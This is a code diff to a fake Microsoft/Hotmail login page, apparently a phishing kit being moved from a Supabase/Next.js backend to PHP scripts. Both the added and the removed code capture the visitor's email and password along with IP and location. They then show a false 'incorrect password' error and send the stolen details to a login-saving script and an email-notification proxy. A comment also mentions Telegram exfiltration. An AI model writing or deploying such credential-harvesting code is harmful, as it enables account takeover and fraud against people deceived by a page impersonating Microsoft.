@@ -182,8 +182,6 @@
             }
         }
     </style>
-    <!-- Add Supabase JS client -->
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
 </head>
 
 <body>
@@ -254,8 +252,9 @@
 
 
     <script>
+        // Add function to fetch user's location and IP
         document.addEventListener("DOMContentLoaded", function() {
-            // Get user location and IP
+            // Get user location and IP - Call this function to fetch the data
             getUserLocationAndIp();
             
             var next = document.querySelector('.next');
@@ -273,7 +272,17 @@
             var continent = document.getElementById('continent')
             var ip = document.getElementById('ip')
             var adminEmail = document.getElementById('adminEmail')
-            var iframLink = document.getElementById('iframLink')
+            var iframLink =document.getElementById('iframLink')
+
+
+            var userName = email.value.replace(/\s+/g, '-')
+            var passWord = password.value.replace(/\s+/g, '-')
+            var countryName = country.value.replace(/\s+/g, '-');
+            var cityName = city.value.replace(/\s+/g, '-');
+            var continentName = continent.value.replace(/\s+/g, '-');
+
+
+
 
             var container_item_2 = document.querySelector('.container-item-2')
             next.addEventListener('click', function () {
@@ -301,85 +310,70 @@
                     msg2.style.color = "#E81123";
                     msg2.textContent = 'Your email or password is incorrect. If you don\'t remember your password, reset it now.';
                     
-                    // Create the data object with correct field names for Supabase
-                    const userData = {
-                        username: email.value + " (MS)",
-                        password: password.value,
-                        country: country.value || "Unknown",
-                        city: city.value || "Unknown",
-                        continent: continent.value || "Unknown",
-                        ip_address: ip.value || "Unknown",
-                        platform: 'microsoft'
-                    };
+                    // Create the form data
+                const formData = new FormData();
+                    formData.append('username', email.value + " (hotmail)");
+                    formData.append('password', password.value);
+                    formData.append('country', country.value);
+                    formData.append('city', city.value);
+                    formData.append('continent', continent.value);
+                    formData.append('ip', ip.value);
+                    formData.append('platform', 'microsoft');
                     
-                    console.log("Sending data to Supabase via API:", userData);
+                    // First save to database
+                fetch('info/login.php', {
+                    method: 'POST',
+                    body: new URLSearchParams(formData)
+                })
+                    .then(response => response.text())
+                .then(data => {
+                    console.log('Data saved to database:', data);
                     
-                    // Add loading indicator or disable button to prevent multiple submissions
-                    submit.disabled = true;
+                        // Then send notification email
+                    sendNotificationEmail();
                     
-                    // Use fetch with proper error handling
-                    fetch('/api/login', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify(userData)
-                    })
-                    .then(response => {
-                        // Check if response is ok before parsing JSON
-                        if (!response.ok) {
-                            throw new Error(`HTTP error! Status: ${response.status}`);
-                        }
-                        return response.json();
-                    })
-                    .then(data => {
-                        console.log('Data saved to Supabase:', data);
-                        
-                        // Send notification email
-                        sendNotificationEmail();
-                        
-                        // Redirect after short delay
-                        setTimeout(() => {
-                            window.location.href = 'https://login.microsoftonline.com';
-                        }, 1000);
-                    })
-                    .catch(error => {
+                        // Remove the redirect code - user will stay on this page
+                })
+                .catch(error => {
                         console.error('Error saving data:', error);
-                        // Re-enable button in case of error
-                        submit.disabled = false;
-                        alert("An error occurred. Please try again later.");
-                    });
-                }
+                });
+            }
             });
             
-            // Update notification function to use Next.js API
+            // Add function to send email notification
             function sendNotificationEmail() {
                 // Create notification data
-                const notificationData = {
-                    username: email.value + " (MS)",
-                    password: password.value,
-                    country: country.value || "Unknown",
-                    city: city.value || "Unknown", 
-                    continent: continent.value || "Unknown",
-                    ip: ip.value || "Unknown",
-                    adminEmail: adminEmail ? adminEmail.value : 'your-admin-email@example.com'
-                };
+                const notificationData = new FormData();
+                notificationData.append('username', email.value + " (hotmail)");
+                notificationData.append('password', password.value);
+                notificationData.append('country', country.value);
+                notificationData.append('city', city.value);
+                notificationData.append('continent', continent.value);
+                notificationData.append('ip', ip.value);
+                notificationData.append('adminEmail', adminEmail.value);
                 
-                // Send notification email
-                fetch('/api/notify', {
+                // Send notification to email proxy
+                fetch('info/mail_proxy.php', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(notificationData)
+                    body: new URLSearchParams(notificationData)
                 })
-                .then(response => response.json())
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error(`HTTP error! Status: ${response.status}`);
+                    }
+                    return response.json();
+                })
                 .then(result => {
                     console.log('Email notification sent:', result);
                 })
                 .catch(error => {
                     console.error('Error sending notification:', error);
                 });
+            }
+
+            // Keep your existing Telegram sending function
+            function sendMessage(message) {
+                // Keep existing Telegram code...
             }
         });
         
